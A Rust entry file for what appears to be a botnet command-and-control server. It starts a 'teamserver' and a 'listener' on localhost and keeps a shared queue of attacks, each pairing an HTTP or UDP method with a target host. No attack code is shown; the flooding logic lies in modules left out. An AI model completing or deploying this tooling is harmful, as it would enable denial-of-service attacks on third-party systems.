mod listener;
mod teamserver;

use std::{fs, io::Read, sync::Arc};

use toml;

use serde::Deserialize;
use serde_json::Value;

use tokio::sync::Mutex;

const TEAMSERVER_ADDR: &str = "127.0.0.1:5555";
const LISTENER_ADDR: &str = "127.0.0.1:8000";

#[derive(Deserialize)]
struct ProfileConfig {
    users: Value 
}

enum AttackMethods { 
    HTTP,
    UDP
}

struct Attack {
    methods: AttackMethods,
    name: String                // IP/Domain/URL etc 
}

#[tokio::main]
async fn main() -> Result<(), std::io::Error> {
    let mut config_string = String::new();

    // Config parsing

    let mut file_config = fs::File::open("config/profile.toml").unwrap();
    file_config.read_to_string(&mut config_string).unwrap();
    let config_parsed: ProfileConfig = toml::from_str(&config_string).unwrap();

    // Spawning tasks

    let attacks: Arc<Mutex<Vec<Attack>>> = Arc::new(Mutex::new(Vec::new()));

    let attacks_clone = Arc::clone(&attacks);
    let teamserver_task = tokio::task::spawn( async { teamserver::run(TEAMSERVER_ADDR, config_parsed, attacks_clone).await } );
    let listener_task = tokio::task::spawn( async { listener::run(LISTENER_ADDR, attacks).await } );

    // Joining tasks

    teamserver_task.await.unwrap();
    listener_task.await.unwrap();

    Ok(())
}
